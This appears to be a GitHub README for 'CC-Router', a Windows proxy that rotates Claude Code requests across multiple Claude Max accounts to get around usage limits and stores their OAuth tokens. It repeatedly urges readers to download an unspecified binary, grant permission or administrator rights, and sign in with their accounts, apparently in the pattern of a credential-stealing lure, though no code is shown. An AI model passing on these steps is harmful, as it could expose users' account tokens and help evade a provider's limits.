# 🤖 CC-Router - Balance Claude Work Across Accounts

[![Download CC-Router](https://img.shields.io/badge/Download-CC--Router-blue?style=for-the-badge)](https://github.com/Foul-plastique636/CC-Router/releases)

## 🧭 What CC-Router does

CC-Router helps you use more than one Claude Max subscription from one setup. It sends each request to the next available account in a round-robin pattern, so your Claude Code work can keep moving when one account hits a limit.

It runs as a local proxy on your Windows PC. You point Claude Code or a similar client at CC-Router, and it handles the request routing for you. It also manages OAuth tokens so you do not need to switch accounts by hand.

## 💻 What you need

- Windows 10 or Windows 11
- A stable internet connection
- One or more Claude Max subscriptions
- Access to the GitHub Releases page
- Enough disk space for the app and its local data

## 📥 Download CC-Router

Visit this page to download:  
https://github.com/Foul-plastique636/CC-Router/releases

On that page, look for the latest release. Download the Windows file that matches your PC. After the download finishes, open the file to run it.

## 🚀 Install and start on Windows

1. Open the [Releases page](https://github.com/Foul-plastique636/CC-Router/releases).
2. Find the latest release at the top of the page.
3. Download the Windows build.
4. Save the file to a folder you can find later, such as Downloads or Desktop.
5. Double-click the file to start CC-Router.
6. If Windows asks for permission, choose Yes or Run.
7. Wait for the app to open and finish its first setup.

If the app comes as a ZIP file, right-click it and choose Extract All first. Then open the extracted folder and run the app file inside it.

## 🛠️ First-time setup

When CC-Router opens for the first time, it will guide you through a short setup flow.

1. Sign in to your Claude account when prompted.
2. Add each Claude Max account you want CC-Router to use.
3. Let the app complete OAuth sign-in for each account.
4. Confirm that all accounts show as connected.
5. Leave the app running while you use Claude Code.

If you use more than one account, CC-Router will rotate requests across them. This helps spread load across your subscriptions.

## 🔌 Connect Claude Code

To use CC-Router with Claude Code, set Claude Code to send its requests through the local proxy that CC-Router creates.

Typical setup steps:

1. Open CC-Router and note the local proxy address.
2. Open Claude Code settings.
3. Look for proxy or network settings.
4. Enter the local address shown in CC-Router.
5. Save the settings.
6. Restart Claude Code if needed.

After that, Claude Code should send requests through CC-Router without any extra steps.

## 🔄 How request rotation works

CC-Router uses round-robin routing. That means it sends one request to Account 1, the next to Account 2, and then back again. It keeps going in order.

This can help when:

- one account reaches a limit
- you want to spread work across subscriptions
- you need a simple local proxy for Claude Code
- you want token handling in one place

It also keeps the routing process transparent, so your client still works as usual while CC-Router handles the account choice in the background.

## 🧰 Main features

- Round-robin request routing
- Local proxy for Claude Code
- OAuth token rotation
- Multiple Claude Max account support
- Simple Windows setup
- Self-hosted on your own PC
- Rate control for smoother use
- Built for developer tools and CLI use

## 🧩 Common setup examples

### One account
Use a single Claude Max account if you want the simplest setup. CC-Router still works as a local proxy, even if you only connect one account.

### Two or more accounts
Add each Claude Max account to CC-Router. It will cycle through them one by one and send each new request to the next account in line.

### Shared Windows machine
If you use one Windows PC for your work, run CC-Router on that machine and keep your account sign-ins stored there. This keeps the setup local and easy to manage.

## 🔍 If the app does not start

Try these steps if CC-Router does not open:

1. Make sure the file finished downloading.
2. Check that you downloaded the Windows version.
3. If the file is in a ZIP, extract it first.
4. Right-click the file and choose Run as administrator.
5. Close other proxy tools that may already use the same port.
6. Restart your PC and try again.

## 🌐 If Claude Code cannot connect

If Claude Code cannot reach CC-Router:

1. Check that CC-Router is still open.
2. Confirm the proxy address in Claude Code.
3. Make sure the port number is correct.
4. Restart Claude Code after saving changes.
5. Check your internet connection.
6. Reconnect your Claude accounts in CC-Router if needed.

## 🔒 Account sign-in and tokens

CC-Router uses OAuth sign-in for connected accounts. That means you sign in through the normal account flow, and the app keeps the token it needs to route requests.

If a token expires or a sign-in stops working, open CC-Router and reconnect that account. Once the account is live again, routing can continue.

## 🖥️ Windows file locations

CC-Router may store local data in a user folder on your PC. This can include:

- signed-in account data
- local settings
- proxy details
- token state

Keep the app in a folder you do not delete by mistake. If you move the files, update your shortcut or run the app from the new location.

## 📌 Tips for smooth use

- Keep CC-Router open while you use Claude Code
- Add all accounts before starting long work
- Match the proxy settings in Claude Code exactly
- Use a stable network connection
- Check account status if routing stops
- Keep the release version current

## 🧭 Topic map

This project fits these areas:

- ai-tools
- anthropic
- claude
- claude-code
- claude-code-proxy
- claude-max
- cli
- developer-tools
- litellm
- llm
- load-balancing
- nodejs
- oauth
- proxy
- rate-limiting
- round-robin
- self-hosted
- token-rotation
- typescript

## 📎 Get the latest release

Download page:  
https://github.com/Foul-plastique636/CC-Router/releases